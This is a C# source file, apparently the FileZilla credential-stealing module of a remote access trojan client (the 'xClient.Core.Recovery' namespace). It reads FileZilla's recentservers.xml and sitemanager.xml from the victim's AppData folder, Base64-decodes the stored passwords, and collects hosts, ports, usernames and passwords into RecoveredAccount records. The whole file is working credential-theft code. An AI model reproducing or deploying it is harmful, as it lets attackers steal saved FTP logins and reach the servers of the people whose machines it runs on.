using System;
using System.Collections.Generic;
using System.Text;
using System.Xml;
using System.IO;
using xClient.Core.Data;
using xClient.Core.Recovery.Utilities;
using xClient.Core.Utilities;

namespace xClient.Core.Recovery.Utilities
{
    public class FileZilla
    {
        public static string szRecentServerPath = string.Format(@"{0}\FileZilla\recentservers.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
        public static string szSiteManagerPath = string.Format(@"{0}\FileZilla\sitemanager.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));

        public static List<RecoveredAccount> GetSavedPasswords()
        {
            List<RecoveredAccount> data = new List<RecoveredAccount>();
            try
            {

                if (!File.Exists(szRecentServerPath) || !File.Exists(szSiteManagerPath))
                {
                    return data;
                }
                else
                {
                    if (File.Exists(szRecentServerPath))
                    {

                        XmlTextReader xmlTReader = new XmlTextReader(szRecentServerPath);
                        XmlDocument xmlDoc = new XmlDocument();
                        xmlDoc.Load(xmlTReader);
                        string szHost, szUsername, szPassword;
                        szHost = string.Empty;
                        szUsername = string.Empty;
                        szPassword = string.Empty;
                        foreach (XmlNode xmlNode in xmlDoc.DocumentElement.ChildNodes[0].ChildNodes)
                        {
                            foreach (XmlNode xmlNodeChild in xmlNode.ChildNodes)
                            {
                                if (xmlNodeChild.Name == "Host")
                                    szHost = xmlNodeChild.InnerText;
                                if (xmlNodeChild.Name == "Port")
                                    szHost = szHost + ":" + xmlNodeChild.InnerText;
                                if (xmlNodeChild.Name == "User")
                                    szUsername = xmlNodeChild.InnerText;
                                if (xmlNodeChild.Name == "Pass")
                                    szPassword = xmlNodeChild.InnerText;
                            }

                            data.Add(new RecoveredAccount
                            {
                                URL = szHost,
                                Username = szUsername,
                                Password = szPassword,
                                Application = "FileZilla"
                            });
                        }

                    }



                    if (File.Exists(szSiteManagerPath))
                    {

                        XmlTextReader xmlTReader = new XmlTextReader(szSiteManagerPath);
                        XmlDocument xmlDoc = new XmlDocument();
                        xmlDoc.Load(xmlTReader);
                        string szHost, szUsername, szPassword;
                        szHost = string.Empty;
                        szUsername = string.Empty;
                        szPassword = string.Empty;
                        foreach (XmlNode xmlNode in xmlDoc.DocumentElement.ChildNodes[0].ChildNodes)
                        {
                            foreach (XmlNode xmlNodeChild in xmlNode.ChildNodes)
                            {
                                if (xmlNodeChild.Name == "Host")
                                    szHost = xmlNodeChild.InnerText;
                                if (xmlNodeChild.Name == "Port")
                                    szHost = szHost + ":" + xmlNodeChild.InnerText;
                                if (xmlNodeChild.Name == "User")
                                    szUsername = xmlNodeChild.InnerText;
                                if (xmlNodeChild.Name == "Pass")
                                    szPassword = Base64Decode(xmlNodeChild.InnerText);
                            }

                            data.Add(new RecoveredAccount
                            {
                                URL = szHost,
                                Username = szUsername,
                                Password = szPassword,
                                Application = "FileZilla"
                            });
                        }

                    }
                    return data;


                }

            }
            catch
            {
                return data;
            }

        }

        public static string Base64Decode(string szInput)
        {
            try
            {
                byte[] Base64ByteArray = Convert.FromBase64String(szInput);
                return Encoding.UTF8.GetString(Base64ByteArray);
            }
            catch
            {
                return "";
            }

        }
    }

}





